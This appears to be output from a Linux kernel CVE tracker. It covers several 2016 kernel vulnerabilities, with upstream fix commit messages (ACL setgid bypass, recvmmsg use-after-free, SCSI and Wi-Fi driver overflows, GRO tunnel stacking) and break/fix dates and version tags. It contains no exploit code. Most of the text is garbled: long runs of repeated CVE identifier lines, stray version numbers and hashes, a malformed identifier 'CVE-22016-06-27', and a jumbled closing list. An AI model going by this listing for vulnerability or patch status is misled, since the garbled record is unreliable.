CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
4.2:
-:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7039:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7039
Break Date: 2015-01-02
Break Commit: 9b174d88c257150562b0101fcc6cb6c3cb74275c
Break Tag: 4.0
Linus Fix Date: -
Linus Commit: local-2016-7039
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
CVE-2016-7042:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7042
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: -
Linus Commit: local-2016-7042
Linus Tag: -
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7097:
CVE-2016-7097:
-:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
CVE-2016-7097:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 073931017b49d9458aa351605b43a7e34598caef
Author: Jan Kara <jack@suse.cz>
Date:   Mon Sep 19 17:39:09 2016 +0200

    posix_acl: Clear SGID bit when setting file permissions
    
    When file permissions are modified via chmod(2) and the user is not in
    the owning group or capable of CAP_FSETID, the setgid bit is cleared in
    inode_change_ok().  Setting a POSIX ACL via setxattr(2) sets the file
    permissions as well as the new ACL, but doesn't clear the setgid bit in
    a similar way; this allows to bypass the check in chmod(2).  Fix that.
    
    References: CVE-2016-7097
    Reviewed-by: Christoph Hellwig <hch@lst.de>
    Reviewed-by: Jeff Layton <jlayton@redhat.com>
    Signed-off-by: Jan Kara <jack@suse.cz>
    Signed-off-by: Andreas Gruenbacher <agruenba@redhat.com>

 fs/9p/acl.c               |   40 +++++++++++++++++-----------------------
 fs/btrfs/acl.c            |    6 ++----
 fs/ceph/acl.c             |    6 ++----
 fs/ext2/acl.c             |   12 ++++--------
 fs/ext4/acl.c             |   12 ++++--------
 fs/f2fs/acl.c             |    6 ++----
 fs/gfs2/acl.c             |   12 +++---------
 fs/hfsplus/posix_acl.c    |    4 ++--
 fs/jffs2/acl.c            |    9 ++++-----
 fs/jfs/acl.c              |    6 ++----
 fs/ocfs2/acl.c            |   10 ++++------
 fs/orangefs/acl.c         |   15 +++++----------
 fs/posix_acl.c            |   31 +++++++++++++++++++++++++++++++
 fs/reiserfs/xattr_acl.c   |    8 ++------
 fs/xfs/xfs_acl.c          |   13 ++++---------
 include/linux/posix_acl.h |    1 +
 16 files changed, 89 insertions(+), 102 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7097
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-22
Linus Commit: 073931017b49d9458aa351605b43a7e34598caef
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-7117:
2.6:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-22016-06-27:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
CVE-2016-7117:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 34b88a68f26a75e4fded796f1a49c40f82234b7d
Author: Arnaldo Carvalho de Melo <acme@redhat.com>
Date:   Mon Mar 14 09:56:35 2016 -0300

    net: Fix use after free in the recvmmsg exit path
    
    The syzkaller fuzzer hit the following use-after-free:
    
      Call Trace:
       [<ffffffff8175ea0e>] __asan_report_load8_noabort+0x3e/0x40 mm/kasan/report.c:295
       [<ffffffff851cc31a>] __sys_recvmmsg+0x6fa/0x7f0 net/socket.c:2261
       [<     inline     >] SYSC_recvmmsg net/socket.c:2281
       [<ffffffff851cc57f>] SyS_recvmmsg+0x16f/0x180 net/socket.c:2270
       [<ffffffff86332bb6>] entry_SYSCALL_64_fastpath+0x16/0x7a
      arch/x86/entry/entry_64.S:185
    
    And, as Dmitry rightly assessed, that is because we can drop the
    reference and then touch it when the underlying recvmsg calls return
    some packets and then hit an error, which will make recvmmsg to set
    sock->sk->sk_err, oops, fix it.
    
    Reported-and-Tested-by: Dmitry Vyukov <dvyukov@google.com>
    Cc: Alexander Potapenko <glider@google.com>
    Cc: Eric Dumazet <edumazet@google.com>
    Cc: Kostya Serebryany <kcc@google.com>
    Cc: Sasha Levin <sasha.levin@oracle.com>
    Fixes: a2e2725541fa ("net: Introduce recvmmsg socket syscall")
    http://lkml.kernel.org/r/20160122211644.GC2470@redhat.com
    Signed-off-by: Arnaldo Carvalho de Melo <acme@redhat.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 net/socket.c |   38 +++++++++++++++++++-------------------
 1 file changed, 19 insertions(+), 19 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-10
CVE: CVE-2016-7117
Break Date: 2009-10-12
Break Commit: a2e2725541fad72416326798c2d7fa4dafb7d337
Break Tag: 2.6
Linus Fix Date: 2016-03-14
Linus Commit: 34b88a68f26a75e4fded796f1a49c40f82234b7d
Linus Tag: 4.6
Stable Date: 2016-04-20
Stable Commit: 902b916d00ba73095b58a9a8dfe926c6a7f635d5
Stable Tag: 3.14.67

CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
CVE-2016-7425:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Sep 15 16:44:56 2016 +0300

    scsi: arcmsr: Buffer overflow in arcmsr_iop_message_xfer()
    
    We need to put an upper bound on "user_len" so the memcpy() doesn't
    overflow.
    
    Cc: <stable@vger.kernel.org>
    Reported-by: Marco Grassi <marco.gra@gmail.com>
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Reviewed-by: Tomas Henzl <thenzl@redhat.com>
    Signed-off-by: Martin K. Petersen <martin.petersen@oracle.com>

 drivers/scsi/arcmsr/arcmsr_hba.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-7425
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-09-15
Linus Commit: 7bc2b55a5c030685b399bb65b6baa9ccc3d1f167
Linus Tag: 4.9
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
2012-09-28:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
CVE-2016-8658:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit ded89912156b1a47d940a0c954c43afbabd0c42c
Author: Arend Van Spriel <arend.vanspriel@broadcom.com>
Date:   Mon Sep 5 10:45:47 2016 +0100

    brcmfmac: avoid potential stack overflow in brcmf_cfg80211_start_ap()
    
    User-space can choose to omit NL80211_ATTR_SSID and only provide raw
    IE TLV data. When doing so it can provide SSID IE with length exceeding
    the allowed size. The driver further processes this IE copying it
    into a local variable without checking the length. Hence stack can be
    corrupted and used as exploit.
    
    Cc: stable@vger.kernel.org # v4.7
    Reported-by: Daxing Guo <freener.gdx@gmail.com>
    Reviewed-by: Hante Meuleman <hante.meuleman@broadcom.com>
    Reviewed-by: Pieter-Paul Giesberts <pieter-paul.giesberts@broadcom.com>
    Reviewed-by: Franky Lin <franky.lin@broadcom.com>
    Signed-off-by: Arend van Spriel <arend.vanspriel@broadcom.com>
    Signed-off-by: Kalle Valo <kvalo@codeaurora.org>

 .../broadcom/brcm80211/brcmfmac/cfg80211.c         |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8658
Break Date: 2012-09-28
Break Commit: 1a87334239757b69eb9885979c32bbf871b3ec88
Break Tag: 3.7
Linus Fix Date: 2016-09-07
Linus Commit: ded89912156b1a47d940a0c954c43afbabd0c42c
Linus Tag: 4.8
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
CVE-2016-8666:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fac8e0f579695a3ecbc4d3cac369139d7f819971
Author: Jesse Gross <jesse@kernel.org>
Date:   Sat Mar 19 09:32:01 2016 -0700

    tunnels: Don't apply GRO to multiple layers of encapsulation.
    
    When drivers express support for TSO of encapsulated packets, they
    only mean that they can do it for one layer of encapsulation.
    Supporting additional levels would mean updating, at a minimum,
    more IP length fields and they are unaware of this.
    
    No encapsulation device expresses support for handling offloaded
    encapsulated packets, so we won't generate these types of frames
    in the transmit path. However, GRO doesn't have a check for
    multiple levels of encapsulation and will attempt to build them.
    
    UDP tunnel GRO actually does prevent this situation but it only
    handles multiple UDP tunnels stacked on top of each other. This
    generalizes that solution to prevent any kind of tunnel stacking
    that would cause problems.
    
    Fixes: bf5a755f ("net-gre-gro: Add GRE support to the GRO stack")
    Signed-off-by: Jesse Gross <jesse@kernel.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/netdevice.h |    4 ++--
 net/core/dev.c            |    2 +-
 net/ipv4/af_inet.c        |   15 ++++++++++++++-
 net/ipv4/gre_offload.c    |    5 +++++
 net/ipv4/udp_offload.c    |    6 +++---
 net/ipv6/ip6_offload.c    |   15 ++++++++++++++-
 6 files changed, 39 insertions(+), 8 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-10-16
CVE: CVE-2016-8666
Break Date: 2014-01-07
Break Commit: bf5a755f5e9186406bbf50f4087100af5bd68e40
Break Tag: 3.14
Linus Fix Date: 2016-03-20
Linus Commit: fac8e0f579695a3ecbc4d3cac369139d7f819971
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
2016-09-11:
CVE-2013-4312:
CVE-2013-7421:
CVE-2013-7421:
CVE-2013-7446:
CVE-2014-0155:
CVE-2014-0181:
CVE-2014-0196:
CVE-2014-0206:
CVE-2014-1737:
CVE-2014-1738:
CVE-2014-1739:
CVE-2014-2580:
CVE-2014-2678:
CVE-2014-2739:
CVE-2014-2851:
CVE-2014-3122:
CVE-2014-3144:
CVE-2014-3145:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3153:
CVE-2014-3181:
CVE-2014-3182:
CVE-2014-3183:
CVE-2014-3184:
CVE-2014-3185:
CVE-2014-3186:
CVE-2014-3534:
CVE-2014-3601:
CVE-2014-3610:
CVE-2014-3611:
CVE-2014-3631:
CVE-2014-3646:
CVE-2014-3647:
CVE-2014-3647:
CVE-2014-3673:
CVE-2014-3687:
CVE-2014-3688:
CVE-2014-3690:
CVE-2014-3917:
CVE-2014-3940:
CVE-2014-4014:
CVE-2014-4157:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4171:
CVE-2014-4508:
CVE-2014-4608:
CVE-2014-4608:
CVE-2014-4611:
CVE-2014-4652:
CVE-2014-4653:
CVE-2014-4654:
CVE-2014-4655:
CVE-2014-4656:
CVE-2014-4656:
CVE-2014-4667:
CVE-2014-4699:
CVE-2014-4943:
CVE-2014-5045:
CVE-2014-5077:
CVE-2014-5206:
CVE-2014-5206:
CVE-2014-5207:
CVE-2014-5207:
CVE-2014-5471:
CVE-2014-5472:
CVE-2014-6410:
CVE-2014-6416:
CVE-2014-6417:
CVE-2014-6418:
CVE-2014-7145:
CVE-2014-7283:
CVE-2014-7284:
CVE-2014-7822:
CVE-2014-7825:
CVE-2014-7826:
CVE-2014-7841:
CVE-2014-7842:
CVE-2014-7843:
CVE-2014-7970:
CVE-2014-7975:
CVE-2014-8086:
CVE-2014-8133:
CVE-2014-8134:
CVE-2014-8159:
CVE-2014-8160:
CVE-2014-8369:
CVE-2014-8480:
CVE-2014-8480:
CVE-2014-8481:
CVE-2014-8559:
CVE-2014-8559:
CVE-2014-8884:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-8989:
CVE-2014-9090:
CVE-2014-9322:
CVE-2014-9322:
CVE-2014-9419:
CVE-2014-9420:
CVE-2014-9428:
CVE-2014-9529:
CVE-2014-9584:
CVE-2014-9585:
CVE-2014-9644:
CVE-2014-9683:
CVE-2014-9710:
CVE-2014-9715:
CVE-2014-9717:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9728:
CVE-2014-9729:
CVE-2014-9730:
CVE-2014-9731:
CVE-2014-9803:
CVE-2014-9904:
CVE-2015-0239:
CVE-2015-0272:
CVE-2015-0274:
CVE-2015-0275:
CVE-2015-1328:
CVE-2015-1333:
CVE-2015-1339:
CVE-2015-1420:
CVE-2015-1421:
CVE-2015-1465:
CVE-2015-1573:
CVE-2015-1593:
CVE-2015-1805:
CVE-2015-1805:
CVE-2015-2041:
CVE-2015-2042:
CVE-2015-2150:
CVE-2015-2666:
CVE-2015-2672:
CVE-2015-2686:
CVE-2015-2830:
CVE-2015-2922:
CVE-2015-2925:
CVE-2015-2925:
CVE-2015-3212:
CVE-2015-3288:
CVE-2015-3290:
CVE-2015-3291:
CVE-2015-3331:
CVE-2015-3332:
CVE-2015-3636:
CVE-2015-4001:
CVE-2015-4002:
CVE-2015-4002:
CVE-2015-4003:
CVE-2015-4004:
CVE-2015-4036:
CVE-2015-4167:
CVE-2015-4176:
CVE-2015-4177:
CVE-2015-4178:
CVE-2015-4692:
CVE-2015-4700:
CVE-2015-5156:
CVE-2015-5157:
CVE-2015-5257:
CVE-2015-5283:
CVE-2015-5307:
CVE-2015-5327:
CVE-2015-5364:
CVE-2015-5366:
CVE-2015-5697:
CVE-2015-5706:
CVE-2015-5707:
CVE-2015-5707:
CVE-2015-6252:
CVE-2015-6526:
CVE-2015-6937:
CVE-2015-7312:
CVE-2015-7513:
CVE-2015-7515:
CVE-2015-7550:
CVE-2015-7566:
CVE-2015-7613:
CVE-2015-7799:
CVE-2015-7799:
CVE-2015-7833:
CVE-2015-7833:
CVE-2015-7837:
CVE-2015-7872:
CVE-2015-7884:
CVE-2015-7885:
CVE-2015-7990:
CVE-2015-8019:
CVE-2015-8104:
CVE-2015-8215:
CVE-2015-8374:
CVE-2015-8539:
CVE-2015-8543:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8550:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8551:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8552:
CVE-2015-8569:
CVE-2015-8575:
CVE-2015-8660:
CVE-2015-8709:
CVE-2015-8746:
CVE-2015-8767:
CVE-2015-8785:
CVE-2015-8787:
CVE-2015-8812:
CVE-2015-8816:
CVE-2015-8830:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8839:
CVE-2015-8844:
CVE-2015-8845:
CVE-2015-8944:
CVE-2015-8950:
CVE-2015-8952:
CVE-2015-8953:
CVE-2015-8955:
CVE-2015-8956:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2015-8970:
CVE-2016-0617:
CVE-2016-0723:
CVE-2016-0728:
CVE-2016-0758:
CVE-2016-0774:
CVE-2016-0821:
CVE-2016-0823:
CVE-2016-1237:
CVE-2016-1237:
CVE-2016-1575:
CVE-2016-1575:
CVE-2016-1576:
CVE-2016-1576:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-1583:
CVE-2016-2053:
CVE-2016-2069:
CVE-2016-2069:
CVE-2016-2070:
CVE-2016-2085:
CVE-2016-2117:
CVE-2016-2143:
CVE-2016-2184:
CVE-2016-2184:
CVE-2016-2185:
CVE-2016-2186:
CVE-2016-2187:
CVE-2016-2188:
CVE-2016-2383:
CVE-2016-2384:
CVE-2016-2543:
CVE-2016-2544:
CVE-2016-2545:
CVE-2016-2546:
CVE-2016-2547:
CVE-2016-2548:
CVE-2016-2549:
CVE-2016-2550:
CVE-2016-2782:
CVE-2016-2847:
CVE-2016-3070:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3134:
CVE-2016-3135:
CVE-2016-3136:
CVE-2016-3137:
CVE-2016-3138:
CVE-2016-3140:
CVE-2016-3156:
CVE-2016-3157:
CVE-2016-3672:
CVE-2016-3689:
CVE-2016-3713:
CVE-2016-3841:
CVE-2016-3857:
CVE-2016-3951:
CVE-2016-3951:
CVE-2016-3955:
CVE-2016-3961:
CVE-2016-4440:
CVE-2016-4470:
CVE-2016-4482:
CVE-2016-4485:
CVE-2016-4486:
CVE-2016-4557:
CVE-2016-4558:
CVE-2016-4565:
CVE-2016-4569:
CVE-2016-4578:
CVE-2016-4578:
CVE-2016-4580:
CVE-2016-4581:
CVE-2016-4794:
CVE-2016-4794:
CVE-2016-4805:
CVE-2016-4913:
CVE-2016-4951:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4997:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-4998:
CVE-2016-5195:
CVE-2016-5243:
CVE-2016-5244:
CVE-2016-5400:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
54dbc15172375641ef03399e8f911d7165eb90fb:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-5412:
CVE-2016-5412:
CVE-2016-5696:
CVE-2016-5728:
CVE-2016-5828:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
51093254bf879bc9ce96590400a87897c7498463:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.9:
CVE-2016-8658:
CVE-2016-8666:
2012-09-28:
CVE-2016-8666:
2016-09-07:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.2:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
-:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
6859d49475d4f32abe640372117e4b687906e6b6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
f69bcbf3b4c4b333dcd7a48eaf868bf0c88edab5:
CVE-2016-5829:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.7:
CVE-2016-6130:
CVE-2016-6136:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.6:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
2.6:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
43761473c254b45883a64441dd0bc85a42f3645c:
CVE-2016-6156:
CVE-2016-6187:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.8:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
4.5:
CVE-2016-6197:
CVE-2016-6198:
CVE-2016-6198:
CVE-2016-6327:
CVE-2016-6480:
CVE-2016-6516:
CVE-2016-6828:
CVE-2016-7039:
CVE-2016-7039:
CVE-2016-7042:
CVE-2016-7097:
CVE-2016-7117:
CVE-2016-7425:
CVE-2016-8658:
CVE-2016-8666:
